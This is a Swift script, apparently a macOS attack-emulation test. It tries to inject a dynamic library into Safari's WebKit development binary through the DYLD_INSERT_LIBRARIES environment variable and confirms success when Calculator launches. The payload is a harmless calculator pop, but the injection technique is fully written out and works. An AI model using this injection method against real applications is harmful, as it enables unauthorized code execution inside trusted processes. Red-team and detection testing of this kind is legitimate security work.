// @nolint
/*
 Copyright © 2023-present, Meta Platforms, Inc. and affiliates
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
 in the Software without restriction, including without limitation the rights
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 copies of the Software, and to permit persons to whom the Software is
 furnished to do so, subject to the following conditions:
 The above copyright notice and this permission notice shall be included in
 all copies or substantial portions of the Software.
 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 THE SOFTWARE.
*/

import Foundation
import Cocoa

print(" ===> Attempting to inject a dylib into /Applications/Safari.app/Contents/MacOS/SafariForWebkitDevelopment...")

let proc = Process()
proc.launchPath = "/bin/bash"
let args: [String] = ["-c", "DYLD_INSERT_LIBRARIES=calc.dylib /Applications/Safari.app/Contents/MacOS/SafariForWebkitDevelopment"]
proc.arguments = args
let pipe = Pipe()
proc.standardOutput = pipe

let timeoutInSeconds = 30.0
let dispatchGroup = DispatchGroup()
dispatchGroup.enter()
DispatchQueue.global(qos: .background).async {
    try? proc.run()
    proc.waitUntilExit()
    dispatchGroup.leave()
}

let result = dispatchGroup.wait(timeout: .now() + timeoutInSeconds)
switch result {
case .success:
    if proc.terminationStatus != 0 {
        print("[-] Error occurred during process execution. Termination status: \(proc.terminationStatus)")
        exit(1)
    }
case .timedOut:
    print("[-] Timeout: DYLIB injection process took too long.")
    proc.terminate()
    exit(1)
}

let results = pipe.fileHandleForReading.readDataToEndOfFile()
let output = String(data: results, encoding: String.Encoding.utf8)!

let myWorkspace = NSWorkspace.shared
let processes = myWorkspace.runningApplications
var procList = [String]()
for i in processes {
    let str1 = "\(i)"
    procList.append(str1)
}

let processes2 = procList.joined(separator: ", ")

if processes2.contains("com.apple.calculator") {
    print("[+] DYLIB Injection successful! TTP Done!")
} else {
    print("[-] DYLIB Injection NOT successful")
}
